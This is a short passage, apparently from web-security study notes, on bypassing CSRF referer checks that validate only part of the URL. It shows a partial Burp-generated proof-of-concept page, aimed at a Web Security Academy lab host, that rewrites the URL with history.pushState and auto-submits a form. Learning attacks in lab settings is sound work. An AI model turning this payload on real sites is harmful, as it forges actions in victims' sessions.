...
Some web application only validate some selective portion of a referer url. In this case we can exploit by making some change in push state function of a csrf exploit.
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head>
<meta name="referrer" content="no-referrer">
  ...
  <body>
    ...
    <script>
      history.pushState('', '', '/?0ab000e704b070fb80180d5f00440091.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
